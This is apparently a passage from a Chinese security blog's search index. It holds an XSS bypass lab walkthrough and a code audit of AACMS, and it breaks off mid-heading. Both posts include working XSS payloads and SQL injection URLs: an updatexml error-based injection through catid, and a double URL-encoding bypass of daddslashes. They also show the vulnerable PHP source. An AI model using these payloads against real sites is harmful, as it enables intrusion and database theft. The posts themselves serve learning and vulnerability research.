<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xss_bypass靶场</title>
    <link href="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/"/>
    <url>/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS-bypass靶场"><a href="#XSS-bypass靶场" class="headerlink" title="XSS bypass靶场"></a>XSS bypass靶场</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>偶然时间看到一个xss bypass的靶场，因为正在对一个xss的过滤规则进行绕过，所以顺手玩了一下，故记录一手</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/moeinfatehi/xss_vulnerability_challenges// 项目地址<br></code></pre></td></tr></table></figure><h4 id="XSS1"><a href="#XSS1" class="headerlink" title="XSS1"></a>XSS1</h4><p>这关没什么，前端js的限制，可以禁用掉浏览器的js，也可以直接抓包过，但个人推荐还是直接抓包过，因为禁用js的话可能会导致页面加载出现一些小问题</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/1.png"></p><h4 id="XSS2"><a href="#XSS2" class="headerlink" title="XSS2"></a>XSS2</h4><p>这一关就是简单的进行构造一下标签</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/2.png"></p><p>可以看到输入在<code>input</code>标签中体现出来，所以可以直接构造<code>payload</code>:<code>11&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/3.png"></p><h4 id="XSS3"><a href="#XSS3" class="headerlink" title="XSS3"></a>XSS3</h4><p>这一关考的应该是js的基础，首先输入个111</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/4.png"></p><p>查看网页源码能够发现这个<code>111</code>被存储为变量name的值</p><p>但可以将这个声明变量的语句进行闭合，然后直接执行<code>payload</code>:<code>111&quot;;alert(/xxx/);//</code></p><p>注意需要注释</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/5.png"></p><p>当前也可以利用一些其他函数，比如<code>eval()</code>、<code>new Function()</code>等</p><p><code>alert(/xxx/)&quot;;eval(name);//</code></p><h4 id="XSS4"><a href="#XSS4" class="headerlink" title="XSS4"></a>XSS4</h4><p>这关，已经直白的说了不能用<code>&lt;script&gt;</code>标签，那就换个标签，然后就是前端限制了，没啥的</p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/6.png"></p><h4 id="XSS5"><a href="#XSS5" class="headerlink" title="XSS5"></a>XSS5</h4><p>这关禁用了<code>&lt; &gt;</code>，禁用了尖括号就不好构造标签了，所以可以尝试使用编码，优先想到的就是url编码</p><p>把尖括号更改为url编码的形式，然后就可以直接过了</p><p><code>payload</code>:<code>111&quot; onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/7.png"></p><h4 id="XSS6"><a href="#XSS6" class="headerlink" title="XSS6"></a>XSS6</h4><p>这关过滤了双引号<code>&quot;</code></p><p>但好像没太理解作者的意思，输入双引号之后，会进行转义，变成<code>\&quot;</code>，而双引号又能够正常进行加载执行</p><p>所以可以直接<code>111&quot; onclick=alert(/xxx/)&gt;</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/8.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss6源码</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);</span><br><span class="hljs-comment">//    $input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);</span><br>    <span class="hljs-variable">$input</span> = str_replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span>, <span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// Failure is an option</span><br>    <span class="hljs-comment">// Bypasses double encoding attacks</span><br>    <span class="hljs-comment">// &lt;script&gt;alert(0)&lt;/script&gt;</span><br>    <span class="hljs-comment">// %3Cscript%3Ealert%280%29%3C%2Fscript%3E</span><br>    <span class="hljs-comment">// %253Cscript%253Ealert%25280%2529%253C%252Fscript%253E</span><br>    <span class="hljs-variable">$input</span> = urldecode(<span class="hljs-variable">$input</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>感觉有点出乎作者的想法，看样子作者本身是想要让使用编码或者一些没有双引号的<code>payload</code>来过这里，结果不曾想双引号是能够直接加载成功的🤣</p><h4 id="XSS7"><a href="#XSS7" class="headerlink" title="XSS7"></a>XSS7</h4><p>这关过滤了双引号，一对尖括号，直接输入的话会返回html实体化编码的形式，但还是可以直接用url编码过</p><p><code>payload</code>:<code>111%22 onclick=alert(/xxx/)%3e</code></p><p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/9.png"></p><h4 id="XSS8"><a href="#XSS8" class="headerlink" title="XSS8"></a>XSS8</h4><p>这关直接摆明，用的<code>htmlentities()</code>稍稍看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># xss8源码</span><br><span class="hljs-meta">&lt;?php</span><br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xss_check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> htmlentities(<span class="hljs-variable">$data</span>, ENT_QUOTES);<span class="hljs-comment"># 编码双引号和单引号。</span><br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$keyword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>];<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>emmm😭，这个我觉着很安全</p><p>没有绝对的安全，其实就是菜</p><img src="/2022/03/03/xss-bypass%E9%9D%B6%E5%9C%BA/10.png" style="zoom:60%;">]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计-AACMS</title>
    <link href="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/"/>
    <url>/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>算是第一次审cms吧，参考学习了这位大哥的思路，故记录一下，emmm，菜鸡的我还不配自己去审，只能先找文章一边参考学习一边审。</p><h4 id="审计过程"><a href="#审计过程" class="headerlink" title="审计过程"></a>审计过程</h4><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p>PHP5.2.17</p><p>MySQL5.7.26</p><p>Apache2.4.39</p><h5 id="程序安装"><a href="#程序安装" class="headerlink" title="程序安装"></a>程序安装</h5><p>先大致浏览下该cms的目录结构，三个入口函数，其他的基本上如图所描述的那样。</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/1.png"></p><p>安装该cms，配置好网站之后直接访问/install/index.php即可，有个地方需要注意的是：数据库默认字符集为GBK，这就可能导致存在宽字节注入</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/2.png"></p><h5 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h5><h6 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/3.png"></p><p>先包含class_core.php，然后调用该文件中的两个方法，最后包含文章模板目录下的index文件</p><p>跟进class_core.php文件查看，先是定义了一个常量，后定义了五个类，找到刚刚index.php中调用的方法</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> &amp; <span class="hljs-title">instance</span>(<span class="hljs-params"></span>) </span>&#123;     <span class="hljs-comment">// 实例化了自己本身的对象：单例模式</span><br><span class="hljs-built_in">static</span> <span class="hljs-variable">$object</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$object</span>)) &#123;<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> core();<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$object</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>再看<code>init()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">init</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 调用该类中的一些其他方法</span><br><br><span class="hljs-keyword">$this</span>-&gt;_init_db();<br><span class="hljs-keyword">$this</span>-&gt;_init_memory();<br><span class="hljs-keyword">$this</span>-&gt;_init_session();<span class="hljs-comment">// 初始化session</span><br><span class="hljs-keyword">$this</span>-&gt;_init_setting();<span class="hljs-comment">//</span><br><span class="hljs-keyword">$this</span>-&gt;_init_misc();<span class="hljs-comment">//初始化时区</span><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_db</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 创建数据库连接</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql&#x27;</span>;<br><span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>][<span class="hljs-string">&#x27;slave&#x27;</span>])) &#123;<span class="hljs-comment">// config中根本没有该内容，所以无法进入</span><br><span class="hljs-keyword">require_once</span> libfile(<span class="hljs-string">&#x27;class/mysql_slave&#x27;</span>);<br><span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;db_mysql_slave&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;db = &amp; DB::object(<span class="hljs-variable">$class</span>);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;set_config(<span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;config&#x27;</span>][<span class="hljs-string">&#x27;db&#x27;</span>]);<br><span class="hljs-keyword">$this</span>-&gt;db-&gt;connect();<br><br>&#125;<br></code></pre></td></tr></table></figure><p>这里引入了$_G这个全局变量，并且根据该全局变量的值进行了一个判断，而PHP中并没有给出这个全局变量，并且在前面也没有对该变量的值进行一个定义操作，所以，需要寻找一下该全局变量是从哪里来的。</p><p>PHP在实例化类时，会调用构造方法，而构造方法分两种，一种是__construct 魔术方法；另一种是将成员方法定义为类名。这里没有使用魔术方法，所以肯定是直接使用的与类名相同的成员方法，找到该方法，跟进并简答分析每一个方法的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">core</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 看名字都知道是一堆初始化</span><br><span class="hljs-keyword">$this</span>-&gt;_init_env();<span class="hljs-comment">// 屏蔽错误信息、设置session、设置XXF头，对$_G进行一定的赋值</span><br><span class="hljs-keyword">$this</span>-&gt;_init_config();<span class="hljs-comment">// 将配置文件全部写入到$_G中</span><br><span class="hljs-keyword">$this</span>-&gt;_init_input();<span class="hljs-comment">// 将GET\POST\COOKIE\FILE等输入全部进行魔术引号过滤</span><br><span class="hljs-keyword">$this</span>-&gt;_init_output();<span class="hljs-comment">// 定义OB缓冲机制，即返回包相关内容</span><br>&#125;<br></code></pre></td></tr></table></figure><p>回到<code>init()</code>方法中调用的<code>__init_db()</code>方法，跟进，确定该方法是用来建立数据库链接，/config/config_global.php中读取相关配置信息，然后进行简历数据库链接</p><p>跟进<code>_init_memory()</code>方法，发现是初始化memory</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_init_memory</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">// 初始化memory</span><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$_G</span>;<br><br><span class="hljs-keyword">$this</span>-&gt;mem = <span class="hljs-keyword">new</span> memory();<span class="hljs-comment">// 实例化memory类</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;init_memory) &#123;<br><span class="hljs-keyword">$this</span>-&gt;mem-&gt;init(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;memory&#x27;</span>]);<br>&#125;<br><span class="hljs-variable">$_G</span>[<span class="hljs-string">&#x27;memory&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;mem-&gt;type;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>后面的也都是一些初始化操作，所以回到index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;index&#x27;</span>);<br></code></pre></td></tr></table></figure><p>跟进<code>template()</code>,其实就是将数据库中的文章显示在index.php中</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/5.png"></p><p>index.php分析完了，结果是没有任何发现，但对该CMS有了一定的了解。继续分析其他的入口函数</p><h6 id="article-php"><a href="#article-php" class="headerlink" title="article.php"></a>article.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/6.png"></p><p>跟随大哥的思路，看一下article_view.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;IN_AACMS&#x27;</span>)) &#123;<span class="hljs-comment">// 该值前面定义过，为True</span><br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Access Denied&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$aid</span> = intval(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]);<span class="hljs-comment">// 获取aid</span><br><span class="hljs-variable">$article</span> = DB::getRow(<span class="hljs-string">&#x27;SELECT * FROM &#x27;</span>.DB::table(<span class="hljs-string">&#x27;article&#x27;</span>).<span class="hljs-string">&quot; WHERE aid=&#x27;<span class="hljs-subst">$aid</span>&#x27;&quot;</span>);<span class="hljs-comment">// 根据aid返回文章</span><br><br><br><br><span class="hljs-keyword">include</span> template(<span class="hljs-string">&#x27;article/view&#x27;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在数据库中插入一条记录，因为该表中的所有字段都不能为null，所以只能所有的都添加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (1, 1, &#x27;aacms 代码审计&#x27;, 1, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, &#x27;代码审计&#x27;, &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p>在浏览器中进行访问</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/7.png"></p><p>从这里开看，如果在插入title和content时内容可控，则可能存在二次注入；比如执行如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">INSERT INTO `aacms`.`pre_article`(`aid`, `catid`, `title`, `uid`, `username`, `author`, `from`, `fromurl`, `summary`, `content`, `pic`, `remote`, `allowcomment`, `tag`, `dateline`) VALUES (2, 2,database(), 2, &#x27;xxx&#x27;, &#x27;mechoy&#x27;, &#x27;freebuf&#x27;, &#x27;xxx&#x27;, &#x27;xxx&#x27;, user(), &#x27;xx&#x27;, 1, 1, 1, 1)<br></code></pre></td></tr></table></figure><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/8.png"></p><p>回到article.php，这里接收了一个aid，但是aid经过<code>intval()</code>的处理了，而<code>intval()</code>函数的返回变量 <code>var</code> 的 [integer]数值，所以导致无法实现注入；</p><h6 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h6><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/9.png"></p><p>在没有登陆的状态下，默认是进入到admin_member.php中，并且根据operation的值跳入到指定模块中去</p><p>到这里，三个入口函数基本了解清楚，由于index.php和article.php没有什么内容，所以只能从admin.php处下手进行审计。</p><h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="发现的漏洞"><a href="#发现的漏洞" class="headerlink" title="发现的漏洞"></a>发现的漏洞</h5><h6 id="1-前台SQL注入"><a href="#1-前台SQL注入" class="headerlink" title="1.前台SQL注入"></a>1.前台SQL注入</h6><p>这里需要先在后台文章处添加一个栏目</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/15.png"></p><p>然后再访问<a href="http://127.0.0.1/aacms28/article.php%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0">http://127.0.0.1/aacms28/article.php就能看到</a></p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/16.png"></p><p>给<code>catid</code>参数加个单引号,页面爆出数据库错误</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/17.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)--%20  //页面返回正常</span><br></code></pre></td></tr></table></figure><p>由此可以构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//127.0.0.1/aacms/article.php?catid=1)%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></code></pre></td></tr></table></figure><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/18.png"></p><p>这里由于是黑盒测试的，所以需要去回去看一下源码，看一下源码该漏洞是如何形成的，可以根据报错信息去寻找漏洞点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># 漏洞位置位于/aacms/source/function/block/block.article.php 25-40行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>]) &#123; <span class="hljs-comment">// 传入catid,没有aid，所以直接进入else</span><br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;aid IN (&#x27;</span>.<span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;aid&#x27;</span>].<span class="hljs-string">&#x27;)&#x27;</span>;<br>&#125;  <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$catid</span> = <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$paramarr</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;catid&#x27;</span>] : <span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$catid</span>) &#123;<br><span class="hljs-variable">$wherearr</span>[] = <span class="hljs-string">&#x27;catid IN (&#x27;</span>.<span class="hljs-variable">$catid</span>.<span class="hljs-string">&#x27;)&#x27;</span>;<span class="hljs-comment">// 采用直接拼接</span><br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$wherearr</span>) &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = implode(<span class="hljs-string">&#x27; AND &#x27;</span>, <span class="hljs-variable">$wherearr</span>);    <span class="hljs-comment">// 返回一个由数据元素组合成的字符串</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>] = <span class="hljs-string">&#x27; 1 &#x27;</span>;<br>&#125;<br>    <span class="hljs-comment"># SELECT COUNT(*) FROM pre_article_index WHERE catid IN (1)</span><br><span class="hljs-variable">$count</span> = DB::getOne(<span class="hljs-string">&quot;SELECT COUNT(*) FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;article_index&#x27;</span>).<span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;where&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>此处是因为对<code>$catid</code>直接拼接，并且该变量没有单引号进行保护</p><h5 id="复现的漏洞"><a href="#复现的漏洞" class="headerlink" title="复现的漏洞"></a>复现的漏洞</h5><h6 id="1-urldecode导致的注入漏洞"><a href="#1-urldecode导致的注入漏洞" class="headerlink" title="1.urldecode导致的注入漏洞"></a>1.<strong>urldecode导致的注入漏洞</strong></h6><p>漏洞位置 <code>\admin\admin_misc.php</code></p><p>这个漏洞产生的原因在于程序对于接受的GET参数再次进行了url解码，因为浏览器在向web应用发送参数时是已经进行了一次url解码，然后经过<code>daddslashes()</code>过滤，但程序内部再一次进行了url解码，就导致可以采用两次url编码来绕过<code>daddslashes()</code>，从而实现注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$operation</span> == <span class="hljs-string">&#x27;custommenu_add&#x27;</span>) &#123;      <span class="hljs-comment">// 浏览器在向web应用传参时会进行一次url解码</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) &#123;        <span class="hljs-comment">// 不为空则进入</span><br><br><span class="hljs-variable">$title</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);     <span class="hljs-comment">// url再次解码，导致可以直接绕过魔术引号</span><br><span class="hljs-variable">$url</span> = urldecode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(DB::getOne(<span class="hljs-string">&quot;SELECT id FROM &quot;</span>.DB::table(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>).<span class="hljs-string">&quot; WHERE title=&#x27;<span class="hljs-subst">$title</span>&#x27;&quot;</span>)) &#123;<br>cpmsg(<span class="hljs-string">&#x27;custommenu_duplicate&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br>DB::insert(<span class="hljs-string">&#x27;admincp_menu&#x27;</span>, <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br><span class="hljs-string">&#x27;displayorder&#x27;</span> =&gt; <span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-variable">$url</span><br>));<br><br>cpmsg(<span class="hljs-string">&#x27;custommenu_add_succeed&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;succeed&#x27;</span>);<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cpmsg(<span class="hljs-string">&#x27;parameters_error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;error&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造<code>url:http://192.168.0.103/aacms28/admin.php?action=misc&amp;operation=custommenu_add&amp;url=456&amp;title=1%2527%20or%20updatexml(1,concat(0x7e,user()),1)%23</code></p><p>需要注意的是，这里的注释符不能直接输入，需要将其进行url编码后再传入</p><p><img src="/2022/02/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-AACMS/10.png"></p><h6 id="2-二次注入漏洞"><a href="#2-二次注入漏洞" 